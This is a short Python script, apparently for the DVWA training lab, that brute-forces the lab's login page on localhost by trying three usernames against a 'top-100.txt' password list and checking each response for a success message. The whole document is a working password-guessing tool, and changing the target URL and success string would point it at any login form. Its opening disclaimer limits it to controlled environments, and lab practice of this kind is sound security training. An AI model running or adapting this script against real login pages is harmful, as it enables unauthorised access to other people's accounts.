import requests
import sys

# DISCLAIMER:
# This script is for EDUCATIONAL USE ONLY inside DVWA or other controlled environments.
# DO NOT USE against systems you do not own or have explicit permission to test.


# Target login page (example DVWA endpoint)
target = "http://localhost/DVWA/vulnerabilities/brute/"

# Replace these with your own test cookies when running locally
cookies = {
    "PHPSESSID": "YOUR_SESSION_ID_HERE",
    "security": "low"
}

# Users to test
usernames = ["admin", "user", "test"]

# Wordlist file
passwords = "top-100.txt"

# Successful login indicator
needle = "Welcome to the password protected area admin"

for username in usernames:
    with open(passwords, "r") as passwords_list:
        found = False
        for password in passwords_list:
            password = password.strip("\n")
            sys.stdout.write("[X] Attempting user:password -> {}:{}\n".format(username, password))
            sys.stdout.flush()

            r = requests.get(
                target,
                params={"username": username, "password": password, "Login": "Login"},
                cookies=cookies
            )

            if needle in r.text:
                sys.stdout.write("[>>>>>] Valid Password '{}' found for user '{}'!\n".format(password, username))
                found = True
                sys.exit()

        if not found:
            sys.stdout.write("[!] No Password Found for '{}'\n".format(username))

